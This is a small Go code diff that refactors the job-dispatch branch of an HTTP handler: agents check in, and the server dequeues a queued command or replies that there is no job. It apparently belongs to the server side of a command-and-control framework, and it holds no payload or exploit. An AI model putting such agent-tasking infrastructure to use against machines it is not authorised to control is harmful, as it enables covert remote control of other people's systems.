@@ -81,21 +81,20 @@ func ProcessRequest(c *gin.Context) {
 
 	case Common.CMD_GET_JOB:
 		//TODO WRITE THE DATA PARSER FOR DATA WE RECEIVE DURING CHECKIN.
+		var (
+			AgentCmd Common.AgentCmd
+		)
 
 		if len(gAgentCmdQueue) == 0 {
-			var (
-				AgentCmd Common.AgentCmd
-			)
+
 			AgentCmd.CmdID = Common.CMD_NO_JOB
 			AgentCmd.RequestID = data_package.RequestID + 1
-			log.Println(AgentCmd.MarshalAgentCmd())
 			c.Data(http.StatusOK, "application/octet-stream", AgentCmd.MarshalAgentCmd())
 
 		} else {
 			var (
-				AgentCmd Common.AgentCmd
-				value    interface{}
-				ok       bool
+				value interface{}
+				ok    bool
 			)
 			value, err = gAgentCmdQueue.Dequeue()
 			if err != nil {
